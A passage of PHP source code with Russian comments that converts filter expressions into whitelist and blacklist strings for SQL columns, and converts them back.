  Разделяет регулярное вырожения на черный и белий список.
  
  IN $name - string, название переменной.
  IN $exp  - string, регулярное вырожение.
  
  Return   - string, данные для SQL столбцов.
*/
function ExpToSQLLists($name, $exp)
{
  $list   = ExpToArray($exp);
  $bl     = array();
  $wl     = array();
  $cur_wl = true;
  
  //Заполняем списки.
  foreach($list as $item)
  {
    if($item[1] == 0)
    {
      //Игнорируем условие OR или AND.
      if(strcmp($item[0],  'OR') === 0 || strcmp($item[0], 'AND') === 0)continue;
      if(strcmp($item[0], 'NOT') === 0)
      {
        $cur_wl = false;//Или $cur_wl = !$cur_wl.
        continue;
      }
    }
    
    $item = str_replace("\x01", "\x02", $item[0]); //Заменяем спец. символ.
    if($cur_wl)$wl[] = $item;
    else       $bl[] = $item;
  }
 
  return "{$name}_wl='".addslashes((count($wl) > 0 ? "\x01".implode("\x01", $wl)."\x01" : ''))."',".
         "{$name}_bl='".addslashes((count($bl) > 0 ? "\x01".implode("\x01", $bl)."\x01" : ''))."'";
}

/*
  Преобразует черный и белый списки в регулярное выражение.
  
  IN $wl - string, белый список.
  IN $bl - string, черный список.
  
  Return - string, регулярное выражение.
*/
function SQLListToExp($wl, $bl)
{
  $l[0] = explode("\x01", $wl);
  $l[1] = explode("\x01", $bl);
  $s[0] = array();
  $s[1] = array();
  
  for($i = 0; $i < 2; $i++)foreach($l[$i] as $v)
  {
    $v = trim($v);
    if(strlen($v) > 0)
    {
      if(spacechars_exists($v))$v = '"'.addcslashes($v, '"').'"';
      $s[$i][] = $v;
    }
  }
  
  $str = implode(' ', $s[0]);
  if(count($s[1]) > 0)$str .= (strlen($str) > 0 ? ' ' : '').'NOT '. implode(' ', $s[1]);
  return $str;
}
?>